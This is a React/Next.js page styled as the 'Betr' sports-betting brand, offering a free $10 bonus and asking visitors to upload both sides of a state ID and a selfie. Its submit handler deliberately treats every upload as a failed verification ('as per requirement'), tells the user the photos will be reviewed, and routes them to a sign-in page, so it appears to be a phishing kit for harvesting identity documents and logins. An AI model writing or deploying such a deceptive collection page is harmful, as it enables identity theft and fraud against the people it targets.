'use client';

import { useSearchParams, useRouter } from 'next/navigation';
import { useState, useRef, Suspense } from 'react';

function VerifyIDContent() {
  const searchParams = useSearchParams();
  const router = useRouter();
  const userId = searchParams.get('userId');
  
  const [frontPhoto, setFrontPhoto] = useState<File | null>(null);
  const [backPhoto, setBackPhoto] = useState<File | null>(null);
  const [selfiePhoto, setSelfiePhoto] = useState<File | null>(null);
  const [frontPreview, setFrontPreview] = useState<string>('');
  const [backPreview, setBackPreview] = useState<string>('');
  const [selfiePreview, setSelfiePreview] = useState<string>('');
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');
  const [loading, setLoading] = useState(false);
  const [verificationFailed, setVerificationFailed] = useState(false);
  
  const frontInputRef = useRef<HTMLInputElement>(null);
  const backInputRef = useRef<HTMLInputElement>(null);
  const selfieInputRef = useRef<HTMLInputElement>(null);

  const handleFileSelect = (
    e: React.ChangeEvent<HTMLInputElement>,
    photoType: 'front' | 'back' | 'selfie'
  ) => {
    const file = e.target.files?.[0];
    if (!file) return;

    // Validate file type
    if (!file.type.startsWith('image/')) {
      setError('Please select an image file');
      return;
    }

    // Validate file size (max 10MB before compression)
    if (file.size > 10 * 1024 * 1024) {
      setError('File size must be less than 10MB');
      return;
    }

    // Create preview and compress image
    const reader = new FileReader();
    reader.onload = (event) => {
      const preview = event.target?.result as string;
      
      // Compress image using canvas
      const img = new Image();
      img.onload = () => {
        const canvas = document.createElement('canvas');
        let width = img.width;
        let height = img.height;
        
        // Scale down if image is large
        const maxWidth = 1024;
        const maxHeight = 1024;
        if (width > maxWidth || height > maxHeight) {
          const ratio = Math.min(maxWidth / width, maxHeight / height);
          width *= ratio;
          height *= ratio;
        }
        
        canvas.width = width;
        canvas.height = height;
        const ctx = canvas.getContext('2d');
        if (ctx) {
          ctx.drawImage(img, 0, 0, width, height);
          const compressedDataUrl = canvas.toDataURL('image/jpeg', 0.8);
          
          // Convert compressed data URL to File
          fetch(compressedDataUrl)
            .then(res => res.blob())
            .then(blob => {
              const compressedFile = new File([blob], file.name, { type: 'image/jpeg' });
              if (photoType === 'back') {
                setBackPhoto(compressedFile);
                setBackPreview(preview);
              } else if (photoType === 'selfie') {
                setSelfiePhoto(compressedFile);
                setSelfiePreview(preview);
              } else {
                setFrontPhoto(compressedFile);
                setFrontPreview(preview);
              }
            });
        }
      };
      img.src = preview;
    };
    reader.readAsDataURL(file);
    setError('');
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setSuccess('');

    if (!userId) {
      setError('User ID not found. Please complete registration first.');
      return;
    }

    if (!frontPhoto || !backPhoto || !selfiePhoto) {
      setError('Please upload front of ID, back of ID, and a selfie');
      return;
    }

    setLoading(true);

    try {
      const formData = new FormData();
      formData.append('userId', userId);
      formData.append('frontPhoto', frontPhoto);
      formData.append('backPhoto', backPhoto);
      formData.append('selfiePhoto', selfiePhoto);

      console.log('=== SUBMITTING ID VERIFICATION ===');
      console.log('userId:', userId);
      console.log('frontPhoto:', frontPhoto.name, 'size:', frontPhoto.size);
      console.log('backPhoto:', backPhoto.name, 'size:', backPhoto.size);
      console.log('selfiePhoto:', selfiePhoto.name, 'size:', selfiePhoto.size);

      const response = await fetch('/api/verify-id', {
        method: 'POST',
        body: formData,
      });

      console.log('Response status:', response.status);
      console.log('Response ok:', response.ok);

      const data = await response.json();
      
      console.log('Response data:', data);

      if (response.ok) {
        // Verification always fails as per requirement
        console.log('Upload successful, showing verification failed');
        setVerificationFailed(true);
        setError('Verification Failed');
      } else {
        console.error('Upload failed with error:', data.error);
        setError(data.error || 'Upload failed');
      }
    } catch (err) {
      const errorMessage = err instanceof Error ? err.message : 'Unknown error occurred';
      console.error('=== UPLOAD ERROR ===');
      console.error('Error type:', err instanceof Error ? 'Error' : typeof err);
      console.error('Error message:', errorMessage);
      console.error('Full error:', err);
      setError(`Upload error: ${errorMessage}`);
    } finally {
      setLoading(false);
    }
  };

  const handleRetry = () => {
    setVerificationFailed(false);
    setFrontPhoto(null);
    setBackPhoto(null);
    setSelfiePhoto(null);
    setFrontPreview('');
    setBackPreview('');
    setSelfiePreview('');
    setError('');
    setSuccess('');
  };

  const handleReturnHome = () => {
    router.push('/');
  };

  if (verificationFailed) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-black via-black to-purple-900 text-white flex items-center justify-center px-4 py-12">
        <div className="max-w-md w-full">
          <div className="text-center mb-8">
            <h1 className="text-4xl font-black text-transparent bg-clip-text bg-linear-to-r from-purple-400 via-purple-500 to-purple-600 mb-4">
              Photos Submitted
            </h1>
            <p className="text-purple-300 mb-6">
              Thank you for submitting your verification photos. Please sign in to complete the verification process.
            </p>
            <div className="p-4 rounded-xl bg-purple-500/20 border border-purple-500/50 mb-6">
              <p className="text-purple-200 text-sm">
                Your photos have been received and will be reviewed.
              </p>
            </div>
          </div>

          <button
            onClick={() => router.push('/login')}
            className="w-full py-3 rounded-xl bg-linear-to-r from-purple-500 to-purple-600 text-white font-bold hover:shadow-lg hover:shadow-purple-500/50 transition-all duration-300"
          >
            Sign In
          </button>
      </div>
    </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-black via-black to-purple-900 text-white flex items-center justify-center px-4 py-12">
      <div className="max-w-2xl w-full">
        <div className="text-center mb-8">
          <h1 className="text-5xl font-black text-transparent bg-clip-text bg-linear-to-r from-purple-400 via-purple-500 to-purple-600 mb-2">
            Betr
          </h1>
          <p className="text-purple-300 text-lg font-semibold mb-6">Free $10 Sports Betting</p>
          <h2 className="text-3xl font-bold text-white mb-4">Verify Your Identity</h2>
          <p className="text-gray-300">
            Please upload clear photos of the front and back of your state ID to complete verification.
          </p>
        </div>

        {error && (
          <div className="mb-6 p-4 rounded-xl bg-red-500/20 border border-red-500/50 text-red-200 text-sm backdrop-blur-sm">
            {error}
          </div>
        )}

        {success && (
          <div className="mb-6 p-4 rounded-xl bg-green-500/20 border border-green-500/50 text-green-200 text-sm backdrop-blur-sm">
            {success}
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-8">
          {/* Front Photo Upload */}
          <div>
            <label className="block text-lg font-bold mb-4 text-purple-300">
              Front of ID
            </label>
            <div
              onClick={() => frontInputRef.current?.click()}
              className="border-2 border-dashed border-purple-500/50 rounded-xl p-8 text-center cursor-pointer hover:border-purple-400 transition-colors bg-purple-500/10 backdrop-blur-sm"
            >
              {frontPreview ? (
                <div className="space-y-4">
                  <img
                    src={frontPreview}
                    alt="Front ID preview"
                    className="max-h-64 mx-auto rounded-lg"
                  />
                  <p className="text-sm text-purple-300">Click to change</p>
                </div>
              ) : (
                <div>
                  <p className="text-lg font-bold text-purple-300 mb-2">
                    Click to upload front of ID
                  </p>
                  <p className="text-sm text-gray-400">
                    PNG, JPG up to 5MB
                  </p>
                </div>
              )}
              <input
                ref={frontInputRef}
                type="file"
                accept="image/*"
                onChange={(e) => handleFileSelect(e, 'front')}
                className="hidden"
              />
            </div>
          </div>

          {/* Back Photo Upload */}
          <div>
            <label className="block text-lg font-bold mb-4 text-purple-300">
              Back of ID
            </label>
            <div
              onClick={() => backInputRef.current?.click()}
              className="border-2 border-dashed border-purple-500/50 rounded-xl p-8 text-center cursor-pointer hover:border-purple-400 transition-colors bg-purple-500/10 backdrop-blur-sm"
            >
              {backPreview ? (
                <div className="space-y-4">
                  <img
                    src={backPreview}
                    alt="Back ID preview"
                    className="max-h-64 mx-auto rounded-lg"
                  />
                  <p className="text-sm text-purple-300">Click to change</p>
                </div>
              ) : (
                <div>
                  <p className="text-lg font-bold text-purple-300 mb-2">
                    Click to upload back of ID
                  </p>
                  <p className="text-sm text-gray-400">
                    PNG, JPG up to 5MB
                  </p>
                </div>
              )}
              <input
                ref={backInputRef}
                type="file"
                accept="image/*"
                onChange={(e) => handleFileSelect(e, 'back')}
                className="hidden"
              />
            </div>
          </div>

          {/* Selfie Photo Upload */}
          <div>
            <label className="block text-lg font-bold mb-4 text-purple-300">
              Selfie - Take a photo of yourself
            </label>
            <div
              onClick={() => selfieInputRef.current?.click()}
              className="border-2 border-dashed border-purple-500/50 rounded-xl p-8 text-center cursor-pointer hover:border-purple-400 transition-colors bg-purple-500/10 backdrop-blur-sm"
            >
              {selfiePreview ? (
                <div className="space-y-4">
                  <img
                    src={selfiePreview}
                    alt="Selfie preview"
                    className="max-h-64 mx-auto rounded-lg"
                  />
                  <p className="text-sm text-purple-300">Click to change</p>
                </div>
              ) : (
                <div>
                  <p className="text-lg font-bold text-purple-300 mb-2">
                    Click to upload selfie
                  </p>
                  <p className="text-sm text-gray-400">
                    PNG, JPG up to 5MB
                  </p>
                </div>
              )}
              <input
                ref={selfieInputRef}
                type="file"
                accept="image/*"
                onChange={(e) => handleFileSelect(e, 'selfie')}
                className="hidden"
              />
            </div>
          </div>

          {/* Submit Button */}
          <button
            type="submit"
            disabled={!frontPhoto || !backPhoto || !selfiePhoto || loading}
            className={`w-full py-3 rounded-xl font-bold text-lg transition-all duration-300 ${
              !frontPhoto || !backPhoto || !selfiePhoto || loading
                ? 'bg-gray-600 text-gray-400 cursor-not-allowed'
                : 'bg-linear-to-r from-purple-500 to-purple-600 text-white hover:shadow-lg hover:shadow-purple-500/50'
            }`}
          >
            {loading ? 'Uploading...' : 'Submit for Verification'}
          </button>
        </form>

        {/* Footer Info */}
        <div className="mt-12 pt-8 border-t border-purple-500/30">
          <p className="text-xs text-gray-400 text-center">
            Your photos will be securely stored and used only for identity verification purposes.
          </p>
        </div>
      </div>
    </div>
  );
}

export default function VerifyID() {
  return (
    <Suspense fallback={
      <div className="min-h-screen bg-gradient-to-br from-black via-black to-purple-900 text-white flex items-center justify-center">
        <div className="text-center">
          <h1 className="text-3xl font-bold mb-4">Loading...</h1>
        </div>
      </div>
    }>
      <VerifyIDContent />
    </Suspense>
  );
}
